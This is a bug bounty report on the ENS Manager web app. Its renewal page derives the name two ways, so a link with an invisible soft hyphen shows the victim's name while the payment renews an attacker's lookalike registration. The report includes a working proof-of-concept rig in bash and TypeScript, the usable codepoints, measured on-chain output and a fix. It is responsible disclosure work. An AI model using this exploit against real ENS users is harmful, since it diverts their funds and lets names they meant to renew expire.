# 92850 w a critical two conflicting ens name derivations on the manager s renewal page cause the victim to pay to extend an attacker s registration instead of the name shown on screen

**Submitted on Sep 12th 2026 at 19:58:05 UTC by @kwaro for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92850
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

The Manager's renewal page resolves its URL parameter into an ENS name twice, using two routines that disagree. The on-chain expiry, the protocol, the grace check and the duration options come from an ENSIP-15 normalized name, while the heading, the price quote and the `renew()` calldata come from a string that has only been trimmed and lowercased. ENSIP-15 deletes several codepoints that `toLowerCase()` preserves, and those codepoints have no glyph, so a link containing one produces a page that displays the victim's own name and that name's genuine expiry while building a transaction for a different label. ENS does not normalize on-chain, so an attacker can register that label beforehand. In production the victim pays the full renewal price, the attacker's registration gains the paid-for term, and the name the victim meant to renew is left to expire.

## Vulnerability Details

### The loader produces two values from one parameter

`apps/manager/src/routes/renew/$name.tsx`, lines 19 to 28 and 52 to 63:

```ts
  loader: async ({ params: { name }, context: { queryClient } }) => {
    const parsedName = parseRenewableName(name)

    if (parsedName.isErr()) {
      throw parsedName.error
    }

    const expiryData = await queryClient.ensureQueryData(
      profileExpiryQuery(name),
    )
```

```ts
    if (!canRenewV2Name(name, expiryDate)) {
      throw new Error('This name is not available for renewal.')
    }

    if (!expiryData.expiry) {
      throw new Error('Name expiry could not be loaded.')
    }

    return {
      label: parsedName.value.label,
      currentExpiry: expiryData.expiry,
    }
```

`currentExpiry` comes from `profileExpiryQuery(name)`. `label` comes from `parseRenewableName(name)`. Both descend from the same route parameter through different code, and every component downstream treats them as describing one name.

### The expiry side applies ENSIP-15

`profileExpiryQuery` reaches `getExpiry`, which normalizes before it reads anything. `apps/manager/src/features/profile/service/profileExpiry.ts`, lines 73 to 77:

```ts
export const getExpiry = ResultFn(async function* (
  name: string,
  protocol?: ProfileProtocol,
) {
  const ethName = normalizeEth2LdName(name)
```

`normalizeEth2LdName` calls `normalizeEthName`, which wraps `normalize` from `viem/ens`, the ENSIP-15 implementation. `apps/manager/src/features/profile/service/profileName.ts`, line 1 and lines 62 to 63:

```ts
import { normalize } from 'viem/ens'
```

```ts
export const normalizeEth2LdName = (name: string): Eth2LdName | null => {
  const ethName = normalizeEthName(name)
```

The expiry, the protocol, and the duration presets computed from `currentExpiry` in `DurationSelector.tsx` lines 23 to 31 therefore all belong to the normalized name.

### The transaction side does not

`parseRenewableName` delegates to `parseName`. `apps/manager/src/features/renew/utils/renewableName.ts`, lines 25 to 26:

```ts
export const parseRenewableName = (name: string) =>
  parseName(name).andThen((parsedName) => {
```

`parseName` normalizes like this, and nowhere else. `apps/manager/src/features/register-v2/utils/name-parser.ts`, lines 45 to 46:

```ts
  // Remove any leading or trailing whitespace
  const normalized = name.trim().toLowerCase()
```

The local variable is called `normalized`, which is what makes the defect hard to see when reading the file. ASCII case folding is not ENSIP-15. It applies no NFC, maps no compatibility forms, and removes no ignorable codepoints.

That label is what the page displays, through `PricingStep.tsx` line 27 into `PricingDomainHeader.tsx` lines 7 to 9, which builds the heading as `` `${label}.eth` ``. It is what the price is quoted for, through `ConfirmPurchase.tsx` line 22 into `renewPricing.query.ts` line 69. And it is what reaches the chain, through `ConfirmPurchase.tsx` lines 63 to 72 into `renewalUi.machine.ts` lines 346 to 355, then `packages/transaction-manager/src/machines/registration/registration.actors.ts` lines 1072 to 1076, where `encodeRenewData` at lines 1020 to 1030 places it directly into the `renew()` call.

### Both gates read the raw parameter

`canRenewV2Name` re-parses with the same lowercase-only `parseName`, then checks syntax and the grace window. `apps/manager/src/features/grace/utils/gracePeriod.ts`, lines 41 to 48:

```ts
export const isRenewableV2EthName = (
  name: string,
  expiryDate: Date | null | undefined,
  now: Date = new Date(),
): boolean => {
  const date = normalizeExpiryDate(expiryDate)
  return match({ name, date })
    .with({ name: P.when((value) => !/^[^.]+\.eth$/.test(value)) }, () => false)
```

The pattern `/^[^.]+\.eth$/` only requires that no dot appears before `.eth`, and an invisible codepoint is not a dot. The `expiryDate` argument came from the other derivation, so this gate checks one name's syntax against a different name's expiry and passes.

### Which codepoints make the two disagree

Measured with the Manager's own pinned `viem` (2.52.2), comparing `trim().toLowerCase()` against `normalize`:

| codepoint                                    | kept by `parseName` | ENSIP-15 result    | appearance                     |
| -------------------------------------------- | ------------------- | ------------------ | ------------------------------ |
| U+00AD SOFT HYPHEN                           | yes                 | deleted            | no glyph                       |
| U+FE0F VARIATION SELECTOR-16                 | yes                 | deleted            | no glyph                       |
| U+180B MONGOLIAN FREE VARIATION SELECTOR ONE | yes                 | deleted            | no glyph                       |
| fullwidth letter forms                       | yes                 | folded to ASCII    | visibly different              |
| U+2170 SMALL ROMAN NUMERAL ONE               | yes                 | folded to `i`      | nearly identical               |
| U+200C, U+200D, U+034F, U+2065               | yes                 | `normalize` throws | route fails at the expiry read |

Only the first three are usable. They diverge and they are Unicode `Default_Ignorable_Code_Point` members, so they render as nothing at all. Once the codepoint is stripped, the heading matches the victim's name character for character.

### The attacker needs no special tooling, and the victim needs no renewal link

ENS performs no normalization on-chain by design, so the registrar accepts any label string. The Manager's own `/register/$name` route shares `parseName`, so it will mint the invisible-codepoint label directly.

The renewal route is also not the only way in. `ProfileActions.tsx` lines 72 to 73 use the normalizer as a predicate and then pass the raw name onward:

```ts
  const isUnmigratedEthName =
    renewalProtocol === 'v1' && normalizeEthName(name) !== null
```

`ProfileRenewAction.tsx` lines 31 to 43 read the expiry through the normalizing `profileExpiryQuery(name)` and decide renewability with the non-normalizing `canRenewV2Name(name, expiryDate)`, so the Renew button appears enabled on the strength of the real name's expiry. The link it renders at lines 81 to 85 passes the raw parameter through:

```tsx
    <LinkButton
      className={className}
      params={{ name }}
      to={getRenewalRoute(resolvedProtocol)}
    >
```

`RenewNameButton.tsx` lines 16 to 22 and 42 to 44 contain the same wiring at a second entry point. An attacker can therefore send an ordinary profile URL. The victim sees their own name's profile, clicks the application's own Renew button, and lands on the split renewal page without ever seeing a renewal URL.

### The v1 route has the same defect

`routes/renew-v1/$name.tsx` is shaped identically. `profileOwnerQuery(name)` and `profileExpiryQuery(name, 'v1')` both normalize, since `getOwner` enters through `normalizeEthName` at `profileOwner.ts` lines 11 and 25, while line 51 returns `parsedName.value.label` to the same `RenewalPage`. Its renewability gate reads on-chain using that raw label at `v1Renewable.query.ts` lines 19 and 28, so the v1 variant is narrower: the attacker's lookalike must itself be v1-renewable. The cause and the fix are the same.

## Impact Details

The attacker registers the invisible-codepoint label, then gets the victim to open `/<lookalike>` or `/renew/<lookalike>`. The page shows the victim's own name in the heading, that name's real on-chain expiry, and renewal durations computed from it. The victim approves and pays. The transaction renews the attacker's label.

Measured against the deployed ENS v2 contracts on a pinned Sepolia fork, with the application's own submitter broadcasting the transaction:

| arm                              | name shown on screen | label actually renewed | victim paid        |
| -------------------------------- | -------------------- | ---------------------- | ------------------ |
| control, plain label             | +31536000 seconds    | +31536000 seconds      | 8000021 USDC units |
| exploit, one invisible codepoint | +0 seconds           | +31536000 seconds      | 8000021 USDC units |

The price is identical in both arms. In the exploit arm the registration that gains a year belongs to the attacker, and the name on screen gains nothing. The victim's funds buy an extension of an asset the attacker owns. The name the victim intended to renew stays unrenewed, so if it was close to expiry it proceeds to expire and becomes registerable by anyone, including the attacker. At that point the loss is the name itself rather than one year's rent.

This matches the in-scope impact "Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient", which the program lists as Critical. The victim performs only the ordinary renewal flow the page exists for. They type nothing, and nothing on screen looks wrong, because the heading is character for character their own name.

One qualification is worth stating. `PricingDomainHeader.tsx` line 11 calls `getPremiumLabel(label.length || 0)`, and `premiumLabel.ts` returns a badge only for label lengths of exactly three or four. The invisible codepoint raises `label.length` by one, so a three or four character name loses its premium badge on the split page. That is a subtle cue and it exists only at those two lengths. For labels of five characters or more there is no badge in either case, and the measured example uses such a label.

## References

* ENSIP-15, the ENS name normalization standard that `viem/ens` `normalize` implements and `parseName` does not: <https://docs.ens.domains/ensip/15>
* Unicode Standard Annex #44, which defines the `Default_Ignorable_Code_Point` property shared by U+00AD, U+FE0F and U+180B: <https://www.unicode.org/reports/tr44/>
* `apps/manager/src/routes/renew/$name.tsx`
* `apps/manager/src/features/register-v2/utils/name-parser.ts`
* `apps/manager/src/features/profile/service/profileExpiry.ts`
* `apps/manager/src/features/profile/service/profileName.ts`
* `apps/manager/src/features/grace/utils/gracePeriod.ts`
* `packages/transaction-manager/src/machines/registration/registration.actors.ts`
* Commit under test: `1c9b47f18fcddd2e864dfe385c4171061c9811ae`

## Proof of Concept

## Proof of Concept

### What this proof runs

Everything below executes against a local anvil forked from Sepolia at pinned block 11689000, running the deployed ENS v2 bytecode. Every state change is a signed transaction mined by that node. The public Sepolia RPC is read only and is used solely to populate the fork, so no transaction reaches Sepolia. Safe harbor is false for this program and nothing is sent to any deployed ENS system.

No part of the rig is mocked. There is no `vi.mock`, no `vi.spyOn`, no stub, no fake transport, no interceptor and no local server answering in place of a remote one. `parseRenewableName`, `normalizeEth2LdName` and `submitRenewActor` are the application's own exported functions. `assertPaymentTokenSupported` performs a real chain read and `transactionManager.startTransaction` performs a real broadcast. The signer is a viem wallet client holding a real key.

There are three arms. Arm 1 puts both registrations on chain. Arm 2 drives the application's own submitter. Arm 3 clicks the whole flow through a real browser against the running application. Each arm has an exploit and a control run that differ only in the URL parameter.

### Step-by-step reproduction

1. Start the fork. The rig uses the repository's own `e2e/infra/docker-compose.yml` with a port and network override so it cannot collide with anything else on the host.

   ```
   SEPOLIA_FORK_URL=<a sepolia rpc> docker compose -p ens-c7-renew \
     -f repos/audit-comp-ens/e2e/infra/docker-compose.yml \
     -f verification/pocs/H-C7-21/compose.isolated.yml up -d anvil
   ```
2. Run the exploit arm.

   ```
   bash verification/pocs/H-C7-21/run.sh exploit
   ```

   Arm 1 resets the fork to the pinned block, funds the victim and the attacker, and clears the contract code that real Sepolia state carries at the well known anvil addresses. Without that last step the registrar's ERC1155 `_safeMint` reverts; the repository's own e2e fixture does the same thing in its step 0. The victim then registers `renewpoc7.eth` and the attacker registers `renewpoc7.eth` with U+00AD between "renew" and "poc7", each with a real `commit` followed by a real `register`.

   Arm 2 derives the label with the application's `parseRenewableName`, derives the name whose expiry the page displayed with the application's `normalizeEth2LdName`, approves USDC, and hands the label to the application's `submitRenewActor`, which broadcasts. Both registrations and the victim's USDC balance are then read back off the chain.
3. Run the control arm.

   ```
   bash verification/pocs/H-C7-21/run.sh control
   ```

   Identical code path, identical chain, identical price. The only difference is that the URL parameter carries no invisible codepoint.

### Measured output, arm 1, chain setup

```
chain      = 11155111 @ http://127.0.0.1:8945
fork block = 11689000 (pinned, real Sepolia state)
registrar  = 0xa88553F454b77203B0D036A05c894d555EAAa2Cc
victim     = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
attacker   = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

victim registers  renewpoc7.eth
attacker registers renewU+00ADpoc7.eth  (ENSIP-15 deletes the codepoint)

MEASURED lookalike_registered_on_chain=1
```

The attacker's registration of the invisible-codepoint label succeeds against the real registrar. Every later step depends on that.

### Measured output, arm 2, exploit

```
  url parameter          = renewU+00ADpoc7.eth
  app renews label       = renewU+00ADpoc7   (parseRenewableName)
  app read expiry for    = renewpoc7.eth     (normalizeEth2LdName)
  renewpoc7.eth (shown)   <expiry> -> <expiry>              unchanged
  renewU+00ADpoc7.eth (renewed)  <expiry> -> <expiry + 31536000>
MEASURED victim_paid_usdc_units=8000021
MEASURED name_on_screen_extended_seconds=0
MEASURED label_renewed_extended_seconds=31536000
```

The application's transaction manager reports the broadcast reaching `success`. The chain then shows the attacker's registration a year longer and the displayed name untouched.

Absolute expiry values appear as `<expiry>` because each fork reset registers at a slightly different block timestamp. Only the deltas reproduce between runs, and the deltas carry the claim.

### Measured output, arm 2, control

```
  url parameter          = renewpoc7.eth
  app renews label       = renewpoc7   (parseRenewableName)
  app read expiry for    = renewpoc7.eth   (normalizeEth2LdName)
  renewpoc7.eth (shown)   <expiry> -> <expiry + 31536000>
  renewpoc7.eth (renewed)  <expiry> -> <expiry + 31536000>
MEASURED victim_paid_usdc_units=8000021
MEASURED name_on_screen_extended_seconds=31536000
MEASURED label_renewed_extended_seconds=31536000
```

### The running application serves the split page

Separately from the rig, a vite dev server running `apps/manager` against the same fork was asked for `/renew/renew%C2%ADpoc7.eth`. It returned the page with no "not available for renewal" error and with the raw label in its heading:

```
<h1 ... title="renewU+00ADpoc7.eth">renewU+00ADpoc7.eth</h1>
```

The loader's gates passed on the strength of the normalized name's on-chain state, while the heading carries the un-normalized label. Rendered in a browser, that heading is indistinguishable from `renewpoc7.eth`.

The application was reading the fork rather than public Sepolia, which can be checked independently: `isAvailable("renewpoc7")` returns true on real Sepolia, where the name is unregistered, and false on the fork, where the rig registered it. The page only renders when the normalized name is a live v2 registration.

### Measured output, arm 3, the renewal clicked in a real browser

The same defect driven one layer higher. A real Chromium loads the real Manager app on the fork, connects a real injected wallet through the repository's own headless provider, and clicks the application's own renewal flow. The wallet signs, anvil mines.

Exploit arm, opening `/renew/renew%C2%ADpoc7.eth`:

```
[manager-auth] BackendAuthModal visible - clicking "Skip for now"
[manager-auth] BackendAuthModal dismissed
MEASURED name_on_screen_expiry_before=1820753292
MEASURED label_renewed_expiry_before=1820753360
  heading rendered by the app = renewU+00ADpoc7.eth
  heading without invisibles  = renewpoc7.eth
MEASURED heading_reads_as_victims_own_name=1
MEASURED name_on_screen_extended_seconds=0
MEASURED label_renewed_extended_seconds=2419200
  1 passed
```

Control arm, opening `/renew/renewpoc7.eth`:

```
MEASURED name_on_screen_expiry_before=1820753291
MEASURED label_renewed_expiry_before=1820753291
  heading rendered by the app = renewpoc7.eth
  heading without invisibles  = renewpoc7.eth
MEASURED heading_reads_as_victims_own_name=1
MEASURED name_on_screen_extended_seconds=2419200
MEASURED label_renewed_extended_seconds=2419200
  1 passed
```

The browser flow renews for the minimum term the pricing step offers, which is 28 days, so the figure here is 2419200 seconds rather than the one year used by arm 2. The shape is the same: in the exploit arm the name on screen gains nothing and the attacker's registration gains the paid term, and in the control arm the two are the same registration.

The heading the browser read is `renewU+00ADpoc7.eth`, which strips to `renewpoc7.eth`. A person looking at that page sees their own name.

### The one thing this proof does not cover

`PricingDomainHeader.tsx` line 11 calls `getPremiumLabel(label.length || 0)`, and `premiumLabel.ts` returns a badge only for label lengths of exactly three or four. The invisible codepoint raises `label.length` by one, so a three or four character name loses its premium badge on the split page. That is a subtle cue, and it exists only at those two lengths. For labels of five characters or more there is no badge in either case, and the measured examples use such a label.

### Recommended fix

Apply ENSIP-15 where the application currently lowercases, so the label the page acts on is the label the name resolves to.

```ts
// apps/manager/src/features/register-v2/utils/name-parser.ts
import { normalize as ensip15Normalize } from 'viem/ens'
...
  let normalized: string
  try {
    normalized = ensip15Normalize(name.trim())
  } catch {
    return ParseNameError.err('INVALID_CHARACTER')
  }
```

This patch was applied to the pinned tree and the exploit arm re-run against it. `name_on_screen_extended_seconds` moves from 0 to 31536000, because with ENSIP-15 in `parseName` the label the page acts on becomes the label the name resolves to, so the victim's own registration receives the year they paid for. The control arm continues to run and to measure what it measured, which separates a fix that closes the defect from one that merely breaks the harness.

Worth adding independently: have the renew loader compare the label it is about to pass to `RenewalPage` against the name the expiry was read for, and reject the route when they differ. The loader already holds both values.

The same patch closes `routes/renew-v1/$name.tsx`, because that route also reaches `parseName`.

### Full source

#### `run.sh`

```bash
#!/usr/bin/env bash
# H-C7-21 rig — REAL EXECUTION, NO MOCKS.
#
# A local anvil FORKED FROM SEPOLIA at a pinned block runs the genuine deployed ENS v2
# bytecode. Every state change is a signed transaction mined by that node. The public
# Sepolia RPC is read-only, used solely to populate the fork: no transaction from this rig
# ever reaches Sepolia, and safe harbor is FALSE for this program.
#
# Arms:
#   1 chain setup  reset the fork to the pinned block, then the victim registers REAL and
#                  the attacker registers LOOKALIKE (REAL plus one codepoint ENSIP-15
#                  deletes and toLowerCase() keeps). Real commit/register transactions.
#   2 app submit   the app's own parseRenewableName derives the label, the app's own
#                  normalizeEth2LdName derives the name whose expiry the page showed, and
#                  the app's own submitRenewActor BROADCASTS the renewal with a real
#                  wallet. Both registrations are then read back off the chain.
#
# Control renews the plain label; exploit renews the invisible-codepoint one. Identical
# code path, identical chain, identical price — only the URL parameter differs.
#
# Prerequisite, once per machine:
#   SEPOLIA_FORK_URL=<sepolia rpc> docker compose -p ens-c7-renew \
#     -f repos/audit-comp-ens/e2e/infra/docker-compose.yml \
#     -f verification/pocs/H-C7-21/compose.isolated.yml up -d anvil
#
# Usage: run.sh [exploit|control]
set -euo pipefail

ARM="${1:-exploit}"
case "$ARM" in exploit|control) ;; *) echo "FATAL: arm must be exploit|control, got '$ARM'" >&2; exit 1;; esac

HERE="$(cd -P "$(dirname "$0")" && pwd)"
ROOT="$HERE/../../../repos/audit-comp-ens"
E2E="$ROOT/e2e"
MGR="$ROOT/apps/manager"
RPC="${ANVIL_RPC_URL:-http://127.0.0.1:8945}"

[ -d "$E2E" ]     || { echo "FATAL: e2e package not found at $E2E" >&2; exit 1; }
[ -d "$MGR/src" ] || { echo "FATAL: manager app not found at $MGR" >&2; exit 1; }

if ! curl -s -m 5 -X POST -H 'content-type: application/json' \
      --data '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}' "$RPC" >/dev/null; then
  echo "FATAL: no anvil at $RPC — start the fork first (see the header of this file)" >&2
  exit 1
fi

export REAL_LABEL="${REAL_LABEL:-renewpoc7}"
if [ "$ARM" = "control" ]; then
  export LOOKALIKE_LABEL="$REAL_LABEL"
else
  # REAL_LABEL with U+00AD (SOFT HYPHEN) spliced in: ENSIP-15 deletes it, toLowerCase keeps it.
  export LOOKALIKE_LABEL="$(printf 'renew\xc2\xadpoc7')"
fi
export ANVIL_RPC_URL="$RPC"
export POC_ARM="$ARM"

cleanup() {
  rm -f "$MGR/src/h-c7-21-submit.test.ts" "$MGR/vitest.h-c7-21.config.ts" "$E2E/h-c7-21-chain.ts"
}
trap cleanup EXIT

echo "=== arm 1/2: chain setup — real registrations on the forked chain ==="
cp "$HERE/chain.ts" "$E2E/h-c7-21-chain.ts"
( cd "$E2E" && MODE=setup pnpm exec tsx h-c7-21-chain.ts )

echo
echo "=== arm 2/2: the app's own submitter broadcasts the renewal ==="
cp "$HERE/submit.test.ts" "$MGR/src/h-c7-21-submit.test.ts"
cp "$HERE/vitest.poc.config.ts" "$MGR/vitest.h-c7-21.config.ts"
( cd "$MGR" && pnpm exec vitest run --config vitest.h-c7-21.config.ts \
    src/h-c7-21-submit.test.ts --reporter=verbose )
```

#### `chain.ts`

```ts
/**
 * H-C7-21 chain arm — real transactions against the real ENS v2 contracts.
 *
 * A local anvil FORKED FROM SEPOLIA at a pinned block runs the genuine deployed
 * bytecode. Nothing is mocked, stubbed or simulated: every state change below is a
 * signed transaction mined by that node. The public Sepolia RPC is used read-only to
 * populate the fork; no transaction from this rig ever reaches Sepolia.
 *
 *   MODE=setup  reset the fork, then REGISTER the victim's name and the attacker's
 *               invisible-codepoint lookalike (both ENS v2). Prints both expiries.
 *   MODE=renew  read the label the REAL app loader produced (labels.json) and submit
 *               the victim's renewal with it. Prints both expiries and the USDC spent.
 *
 * The renewed label is NEVER typed here — it is read from what the app's own route
 * loader returned, so this arm cannot agree with the app by coincidence.
 */
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import {
  getExpiry as ensjsGetExpiry,
  getRenewPrice as ensjsGetRenewPrice,
} from '@ensdomains/ensjs/public/v2'
import { readFileSync } from 'node:fs'
import {
  type Address,
  type Hash,
  bytesToHex,
  createPublicClient,
  createTestClient,
  createWalletClient,
  encodeFunctionData,
  http,
  keccak256,
  parseAbi,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { mnemonicToAccount, privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'

const RPC = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8945'
const FORK_URL =
  process.env.SEPOLIA_FORK_URL ??
  'https://lb.drpc.live/sepolia/AnmpasF2C0JBqeAEzxVO8aTDnH6wviUR8JD3QmlfqV1j'
const FORK_BLOCK = Number(process.env.FORK_BLOCK ?? 11689000)
const LABELS = process.env.POC_LABELS_OUT ?? '/tmp/h-c7-21-labels.json'
const MODE = process.env.MODE ?? 'setup'

/**
 * The victim's real name, and the attacker's lookalike of it.
 * ENSIP-15 deletes U+00AD, so `normalize(LOOKALIKE) === REAL`; toLowerCase() does not.
 */
const REAL = process.env.REAL_LABEL ?? 'renewpoc7'
const LOOKALIKE = process.env.LOOKALIKE_LABEL ?? 'renew\u00ADpoc7'

const chain = { ...sepolia, rpcUrls: { default: { http: [RPC] } } } as const
const transport = http(RPC)
const pub = createPublicClient({ chain, transport })
const test = createTestClient({ chain, transport, mode: 'anvil' })
const wallet = createWalletClient({ chain, transport })

const s = ensL1Contracts[supportedL1Chains.sepolia]
const REGISTRAR = s.ensEthRegistrar.address
const REGISTRY = s.ensRegistry.address
const USDC = s.usdc.address
const RESOLVER = '0x640294a2b2d87e7f522db3e3e3e876764bce170d' as const

const REGISTRAR_ABI = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function renew(string label, uint64 duration, address paymentToken, bytes32 referrer)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
  'function isAvailable(string label) view returns (bool)',
])
const ERC20_ABI = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)',
])

const MNEMONIC = 'test test test test test test test test test test test junk'
const acct = (i: number) => {
  const { getHdKey } = mnemonicToAccount(MNEMONIC, { addressIndex: i })
  // biome-ignore lint/style/noNonNullAssertion: hd key always has a private key
  return privateKeyToAccount(bytesToHex(getHdKey().privateKey!) as Hash)
}
const VICTIM = acct(0)
const ATTACKER = acct(1)

const YEAR = 365n * 24n * 60n * 60n
const hex = (str: string) =>
  [...str]
    .map((c) =>
      (c.codePointAt(0) ?? 0) > 126
        ? `U+${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, '0')}`
        : c,
    )
    .join('')

const send = async (account: typeof VICTIM, to: Address, data: `0x${string}`) => {
  const h = await wallet.sendTransaction({ account, chain, to, data })
  const r = await pub.waitForTransactionReceipt({ hash: h })
  if (r.status !== 'success') throw new Error(`tx reverted: ${h}`)
  return r
}

const expiryOf = async (label: string): Promise<bigint> =>
  (await ensjsGetExpiry(pub as never, {
    name: `${label}.eth`,
    registryAddress: REGISTRY,
  })) as bigint

const usdcOf = (who: Address) =>
  pub.readContract({ address: USDC, abi: ERC20_ABI, functionName: 'balanceOf', args: [who] })

async function fund(who: Address) {
  // The well-known anvil accounts carry contract code at their addresses in real Sepolia
  // state, which makes the registrar's ERC1155 _safeMint revert. The repo's own e2e
  // fixture clears it the same way (e2e/fixtures/makeName.ts, step 0).
  await test.setCode({ address: who, bytecode: '0x' })
  await test.setBalance({ address: who, value: 10n ** 20n })
  await send(
    VICTIM,
    USDC,
    encodeFunctionData({ abi: ERC20_ABI, functionName: 'mint', args: [who, 10n ** 12n] }),
  )
}

async function registerLabel(owner: typeof VICTIM, label: string) {
  const secret = keccak256(toHex(`${label}:${Math.random()}`))
  const commitment = await pub.readContract({
    address: REGISTRAR,
    abi: REGISTRAR_ABI,
    functionName: 'makeCommitment',
    args: [label, owner.address, secret, zeroAddress, RESOLVER, YEAR, zeroHash],
  })
  await send(
    owner,
    REGISTRAR,
    encodeFunctionData({ abi: REGISTRAR_ABI, functionName: 'commit', args: [commitment] }),
  )
  const minAge = await pub.readContract({
    address: REGISTRAR,
    abi: REGISTRAR_ABI,
    functionName: 'MIN_COMMITMENT_AGE',
  })
  await test.increaseTime({ seconds: Number(minAge) + 5 })
  await test.mine({ blocks: 1 })
  const [base, premium] = await pub.readContract({
    address: REGISTRAR,
    abi: REGISTRAR_ABI,
    functionName: 'getRegisterPrice',
    args: [label, YEAR, USDC],
  })
  await send(
    owner,
    USDC,
    encodeFunctionData({
      abi: ERC20_ABI,
      functionName: 'approve',
      args: [REGISTRAR, (base + premium) * 3n],
    }),
  )
  await send(
    owner,
    REGISTRAR,
    encodeFunctionData({
      abi: REGISTRAR_ABI,
      functionName: 'register',
      args: [label, owner.address, secret, zeroAddress, RESOLVER, YEAR, USDC, zeroHash],
    }),
  )
}

async function setup() {
  // Re-fork at the pinned block so every run starts from identical state.
  await test.reset({ jsonRpcUrl: FORK_URL, blockNumber: BigInt(FORK_BLOCK) })
  console.log(`chain      = ${await pub.getChainId()} @ ${RPC}`)
  console.log(`fork block = ${FORK_BLOCK} (pinned, real Sepolia state)`)
  console.log(`registrar  = ${REGISTRAR}`)
  console.log(`victim     = ${VICTIM.address}`)
  console.log(`attacker   = ${ATTACKER.address}`)
  console.log()

  await fund(VICTIM.address)
  await fund(ATTACKER.address)

  console.log(`victim registers  ${hex(REAL)}.eth`)
  await registerLabel(VICTIM, REAL)

  // In the control arm LOOKALIKE *is* REAL — there is no second name to register, and
  // trying would revert because the label is already taken.
  if (LOOKALIKE !== REAL) {
    console.log(`attacker registers ${hex(LOOKALIKE)}.eth  (ENSIP-15 deletes the codepoint)`)
    await registerLabel(ATTACKER, LOOKALIKE)
  } else {
    console.log(`control arm: no lookalike to register (${hex(LOOKALIKE)} === ${hex(REAL)})`)
  }

  console.log()
  console.log(`MEASURED lookalike_registered_on_chain=${LOOKALIKE !== REAL ? 1 : 0}`)
  console.log(`victim_name_expiry_after_setup=${await expiryOf(REAL)}`)
  console.log(`attacker_name_expiry_after_setup=${await expiryOf(LOOKALIKE)}`)
}

async function renew() {
  const doc = JSON.parse(readFileSync(LABELS, 'utf8')) as {
    arm: string
    rows: { param: string; labelTheAppRenews: string; nameTheExpiryWasReadFor: string }[]
  }
  const row = doc.rows[0]
  if (!row) throw new Error('no rows in labels.json — run the loader arm first')

  // THE LABEL THE APP PRODUCED. Not typed here.
  const label = row.labelTheAppRenews
  console.log(`param the victim opened      = ${hex(row.param)}`)
  console.log(`label the APP LOADER returned = ${hex(label)}`)
  console.log(`name the APP read expiry for  = ${hex(row.nameTheExpiryWasReadFor)}`)
  console.log()

  const realLabel = row.nameTheExpiryWasReadFor.replace(/\.eth$/, '')
  const realBefore = await expiryOf(realLabel)
  const lookBefore = await expiryOf(label)
  const usdcBefore = await usdcOf(VICTIM.address)

  const quote = (await ensjsGetRenewPrice(pub as never, {
    renewerAddress: REGISTRAR,
    label,
    duration: YEAR,
    paymentToken: USDC,
  })) as { amount: bigint }

  await send(
    VICTIM,
    USDC,
    encodeFunctionData({
      abi: ERC20_ABI,
      functionName: 'approve',
      args: [REGISTRAR, quote.amount * 2n],
    }),
  )
  await send(
    VICTIM,
    REGISTRAR,
    encodeFunctionData({
      abi: REGISTRAR_ABI,
      functionName: 'renew',
      args: [label, YEAR, USDC, zeroHash],
    }),
  )

  const realAfter = await expiryOf(realLabel)
  const lookAfter = await expiryOf(label)
  const usdcAfter = await usdcOf(VICTIM.address)

  console.log('=== RESULT, measured on chain ===')
  console.log(`  ${hex(realLabel)}.eth  (the name on screen) ${realBefore} -> ${realAfter}`)
  console.log(`  ${hex(label)}.eth  (the attacker's)        ${lookBefore} -> ${lookAfter}`)
  console.log(`  victim USDC ${usdcBefore} -> ${usdcAfter}`)
  console.log()
  console.log(`MEASURED renew_price_quoted_for_lookalike=${quote.amount}`)
  console.log(`MEASURED victim_paid_usdc_units=${usdcBefore - usdcAfter}`)
  console.log(`MEASURED attacker_name_extended_seconds=${lookAfter - lookBefore}`)
  console.log(`MEASURED victim_name_extended_seconds=${realAfter - realBefore}`)
}

const main = MODE === 'renew' ? renew : setup
main().catch((e) => {
  console.error(e)
  process.exit(1)
})
```

#### `submit.test.ts`

```ts
/**
 * H-C7-21 arm 3 — the app's OWN renewal submitter, broadcasting a REAL transaction.
 *
 * ZERO MOCKS. Not one vi.mock, vi.spyOn, stub, fake transport or interceptor:
 *
 *   - `parseRenewableName` and `normalizeEth2LdName` are the app's real functions, and
 *     they are the two derivations the finding is about.
 *   - `submitRenewActor` is the app's real exported submitter, the same one
 *     apps/manager/src/features/renew/state/renewalUi.machine.ts:346-355 invokes.
 *   - `assertPaymentTokenSupported` runs for real against the chain (it is a chain READ,
 *     and there is now a chain to read).
 *   - `transactionManager.startTransaction` runs for real and BROADCASTS.
 *   - the signer is a real viem wallet client holding a real key, and the public client
 *     points at a local anvil forked from Sepolia at a pinned block, running the genuine
 *     deployed ENS v2 bytecode.
 *
 * The renewal is therefore a signed transaction, mined, and its effect is read back off
 * the chain. Nothing is asserted into existence.
 */
import {
  submitRenewActor,
  pollTransactionStatusActor,
} from '@ens-apps/transaction-manager/machines/registration/registration.actors'
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { getExpiry as ensjsGetExpiry } from '@ensdomains/ensjs/public/v2'
import {
  createPublicClient,
